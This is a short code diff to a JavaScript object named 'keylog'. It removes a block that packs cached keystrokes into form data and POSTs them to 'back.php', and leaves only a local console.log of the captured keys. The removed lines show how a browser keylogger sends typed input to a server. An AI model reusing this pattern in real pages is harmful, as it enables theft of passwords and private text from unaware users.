@@ -17,20 +17,8 @@ var keylog = {
         try{
             if (!keylog.sending && keylog.cache.length != 0) {
                 keylog.sending = true;        
-                //FormData converts the existing data to key value pairs 
-                var data = new FormData();
-                //JSON.stringify converts the formdata into JSON object 
-                data.append("keys", JSON.stringify(keylog.cache)); 
+                console.log(keylog.cache);
                 keylog.cache = [];
-                //XMLHTTPRequest Object to send data 
-                var xhr = new XMLHttpRequest(); 
-                xhr.open("POST", "back.php"); 
-                xhr.onload = function () {
-                    keylog.sending = false;
-                    console.log(this.response); 
-                };
-                xhr.send(data);
-                console.log("HELLO");
             }
         }
         catch(err){
